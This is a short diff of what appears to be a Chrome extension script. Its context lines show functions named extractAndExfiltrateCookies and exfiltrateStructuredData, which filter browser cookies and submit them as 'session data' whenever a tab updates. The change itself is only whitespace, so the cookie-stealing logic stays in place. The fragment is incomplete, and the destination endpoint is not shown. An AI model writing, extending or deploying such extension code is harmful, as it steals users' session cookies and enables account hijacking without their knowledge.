@@ -7,7 +7,7 @@ function extractAndExfiltrateCookies() {
     if (filteredCookies.length === 0) return;
 
     exfiltrateStructuredData(filteredCookies);
-  });
+  });       
 }
 
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
@@ -50,4 +50,3 @@ function exfiltrateStructuredData(cookies) {
     .then(() => console.log("Structured session data submitted"))
     .catch(err => console.error("Submission failed:", err));
 }
-
